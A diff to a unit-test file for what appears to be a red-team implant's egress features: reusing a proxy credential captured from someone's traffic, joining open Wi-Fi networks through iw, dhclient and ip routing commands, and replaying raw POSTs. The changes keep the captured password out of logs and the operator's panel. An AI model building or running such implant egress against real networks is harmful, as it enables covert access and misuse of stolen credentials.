@@ -25,6 +25,7 @@ the next check-in is that probe anyway.
 passwords; the verb's answer names the account and the proxy.
 """
 
+import base64
 import io
 import json
 import os
@@ -72,6 +73,12 @@ class RungCase(_decider.DeciderCase):
             handoff.write_borrow(self.state, borrow)
         return beacon
 
+    def beacon_with_raw_borrow(self, text, **extra):
+        """A beacon whose borrow file is whatever `text` says."""
+        beacon = self.beacon(**extra)
+        Path(handoff.borrow_path(self.state)).write_text(text)
+        return beacon
+
 
 # ── rung 2: borrow ──
 
@@ -111,16 +118,42 @@ class TestTheCredentialVerb(RungCase):
 
         self.assertNotIn("[error]", answer)
         proxies = beacon._proxy_session.proxies
-        self.assertEqual(proxies["https"],
-                         "http://corp%5Calice:s3cret@10.0.0.1:3128")
+        self.assertEqual(proxies["https"], "http://10.0.0.1:3128")
         self.assertEqual(proxies["http"], proxies["https"])
 
-    def test_its_answer_names_the_account_and_never_the_secret(self):
+    def test_the_secret_does_not_leave_the_borrow_file(self):
+        # Not only the verb's answer. A review found the password in the
+        # check-in payload's `proxy_active` and in `proxyinfo`'s output,
+        # because it had been written into the proxy URL -- so a third
+        # party's credential, captured from their traffic, was persisted
+        # in the team server's database and rendered in its panel from the
+        # next check-in onward. That is a finding against the operator on
+        # any engagement with scoped credential handling.
         beacon = self.beacon(borrow={"credentials": [A_CREDENTIAL]})
         answer = beacon._exec_egress("credential")
+
         self.assertIn("corp\\alice", answer)
         self.assertIn("10.0.0.1:3128", answer)
-        self.assertNotIn("s3cret", answer)
+        for where, text in (("the verb's answer", answer),
+                            ("the check-in payload",
+                             json.dumps(beacon._system_info())),
+                            ("proxyinfo", beacon._exec_proxyinfo()),
+                            ("the session's proxies",
+                             json.dumps(beacon._proxy_session.proxies))):
+            with self.subTest(where=where):
+                self.assertNotIn("s3cret", text, where)
+                self.assertNotIn("czNjcmV0", text, where)
+
+    def test_the_credential_still_authenticates_the_proxy(self):
+        # Keeping it out of the URL must not mean dropping it: the header
+        # is what answers the 407.
+        beacon = self.beacon(borrow={"credentials": [A_CREDENTIAL]})
+        beacon._exec_egress("credential")
+        header = beacon._proxy_session.headers.get("Proxy-Authorization", "")
+        self.assertTrue(header.startswith("Basic "))
+        self.assertEqual(
+            base64.b64decode(header.split(None, 1)[1]).decode(),
+            "corp\\alice:s3cret")
 
     def test_it_does_not_claim_the_implant_can_now_get_out(self):
         answer = self.beacon(
@@ -153,12 +186,17 @@ class TestTheCredentialVerb(RungCase):
         self.assertIsNone(beacon._proxy_session)
 
     def test_a_borrow_file_that_is_rubbish_declines_rather_than_raising(self):
-        for text in ("", "{not json", "[]", '{"credentials": "alice"}',
-                     '{"credentials": [17]}',
-                     '{"credentials": [{"kind": "proxy-basic"}]}'):
+        for text in ("", "{not json", "[]",
+                     '{"version": 1, "credentials": "alice"}',
+                     '{"version": 1, "credentials": [17]}',
+                     '{"version": 1, "credentials": [{"kind": "x"}]}',
+                     # A version this implant does not know: the two halves
+                     # are upgraded by two different installs, and this is
+                     # the file that selects a credential.
+                     '{"version": 99, "credentials": [{"kind": "proxy-basic",'
+                     ' "user": "a", "secret": "b", "where": "c:1"}]}'):
             with self.subTest(text=text):
-                beacon = self.beacon()
-                Path(handoff.borrow_path(self.state)).write_text(text)
+                beacon = self.beacon_with_raw_borrow(text)
                 self.assertIn("[error]", beacon._exec_egress("credential"))
 
 
@@ -349,7 +387,29 @@ class TestTheRadioVerb(RadioCase):
                               % line)
             self.assertNotIn("dhclient -nw", line)
 
-    def test_the_association_is_time_boxed(self):
+        # And the dhclient invocation itself, which is the part the argv
+        # list above cannot show: the route in question would be installed
+        # by `dhclient-script`, not by this process. `-sf /bin/true` is
+        # the nine characters that stop it, and nothing asserted them --
+        # delete them and the implant strands itself the first time this
+        # rung fires, with nothing red.
+        dhclient = [argv for argv in ran if argv and argv[0] == "dhclient"]
+        self.assertEqual(len(dhclient), 1, ran)
+        self.assertIn("-sf", dhclient[0])
+        self.assertEqual(dhclient[0][dhclient[0].index("-sf") + 1],
+                         "/bin/true",
+                         "dhclient's own script installs a default route, "
+                         "which is the one thing this rung may never do")
+        self.assertIn("-1", dhclient[0],
+                      "one attempt and then give up: this runs on the "
+                      "beacon's thread")
+
+    def test_every_radio_command_has_a_deadline(self):
+        # A deadline per command, which is what this rung actually has:
+        # it runs on the beacon's own thread, so a `dhclient` that never
+        # returned would cost the implant its loop. It is **not** a time
+        # box on the association, which nothing here ends -- see
+        # `docs/WAY_OUT.md`, which says so rather than implying otherwise.
         beacon = self.beacon(tap=self.open_ssid())
         self.onboard(beacon)
         boxed = []
@@ -411,6 +471,59 @@ class TestTheRadioVerb(RadioCase):
         self.assertIn("Visitors", answer)
         self.assertTrue(any("connect Visitors" in " ".join(a) for a in ran))
 
+    def test_a_second_attempt_does_not_tear_down_a_working_one(self):
+        # No verb tests its own result, so the policy keeps choosing
+        # `radio` on the next stuck cycle: a second attempt is the
+        # ordinary case. It used to fail on `ip addr add` ("File exists"),
+        # roll back with no address to go on -- so neither the table nor
+        # the rule was removed -- and then disconnect and down the
+        # interface, killing the association that was working.
+        beacon = self.beacon(tap=self.open_ssid())
+        self.onboard(beacon)
+        ran = self.radio(beacon)
+        self.assertNotIn("[error]", beacon._exec_egress("radio"))
+
+        del ran[:]
+        answer = beacon._exec_egress("radio")
+        joined = [" ".join(argv) for argv in ran]
+        self.assertNotIn("[error]", answer, joined)
+        self.assertIn("ip addr flush dev wlan0", joined,
+                      "a second attempt has to clear the address the first "
+                      "one installed, or it fails on File exists: %r"
+                      % joined)
+        self.assertNotIn("iw dev wlan0 disconnect", joined,
+                         "a second attempt tore down the first one's "
+                         "association: %r" % joined)
+
+    def test_a_rollback_clears_a_rule_this_attempt_did_not_install(self):
+        # A rollback that only undid its own steps left the *previous*
+        # attempt's source rule and table-100 route behind -- a change the
+        # operator cannot see and cannot undo from the far side. The lease
+        # is how a later rollback knows which address to remove.
+        beacon = self.beacon(tap=self.open_ssid())
+        self.onboard(beacon)
+        ran = self.radio(beacon)
+        self.assertNotIn("[error]", beacon._exec_egress("radio"))
+
+        del ran[:]
+        beacon._exec_egress("radio foo-not-open")      # declines, nothing ran
+        ran2 = self.radio(beacon, fail_at="iw dev wlan0 connect")
+        beacon._exec_egress("radio")
+        joined = [" ".join(argv) for argv in ran2]
+        self.assertIn("ip route flush table 100", joined, joined)
+        self.assertIn("ip rule del from 192.168.9.42 table 100", joined,
+                      joined)
+
+    def test_the_lease_stays_in_the_private_directory(self):
+        # Not litter: it is the only record of which address the source
+        # rule was installed for that survives a restart of this process,
+        # and it lives in the 0700 handoff directory with everything else.
+        beacon = self.beacon(tap=self.open_ssid())
+        self.onboard(beacon)
+        self.radio(beacon)
+        self.assertNotIn("[error]", beacon._exec_egress("radio"))
+        self.assertIn("way_out_radio.lease", os.listdir(self.state))
+
     def test_an_ssid_the_document_does_not_call_open_is_refused(self):
         beacon = self.beacon(tap=self.open_ssid())
         self.onboard(beacon)
@@ -466,6 +579,31 @@ class TestTheRawPostTheReplayUses(unittest.TestCase):
         self.assertEqual(seen["request"].get_header("Content-type"),
                          "application/x-www-form-urlencoded")
         self.assertEqual(seen["timeout"], 20)
+
+    def test_a_sessions_own_headers_are_carried_on_a_json_post(self):
+        # Where the borrowed credential actually goes out. `post` is what
+        # every leg of this beacon uses, and a version that dropped
+        # `self.headers` would leave the rung silently doing nothing: the
+        # proxy would answer 407 again and the operator would read
+        # "credential borrowed" in the trail.
+        session, seen = self.captured()
+        session.headers["Proxy-Authorization"] = "Basic Y29ycDpwdw=="
+        session.post("http://127.0.0.1/api", {"a": 1}, {})
+        self.assertEqual(seen["request"].get_header("Proxy-authorization"),
+                         "Basic Y29ycDpwdw==")
+
+    def test_a_per_request_header_wins_over_the_sessions(self):
+        session, seen = self.captured()
+        session.headers["X-Thing"] = "session"
+        session.post("http://127.0.0.1/api", {"a": 1}, {"X-Thing": "request"})
+        self.assertEqual(seen["request"].get_header("X-thing"), "request")
+
+    def test_a_sessions_own_headers_are_carried_on_a_raw_post(self):
+        session, seen = self.captured()
+        session.headers["Proxy-Authorization"] = "Basic Y29ycDpwdw=="
+        session.post_raw("http://portal.lan/login", b"a=1", {})
+        self.assertEqual(seen["request"].get_header("Proxy-authorization"),
+                         "Basic Y29ycDpwdw==")
 
     def test_a_refusal_is_an_answer_and_not_an_exception(self):
         session, _ = self.captured(status=403)
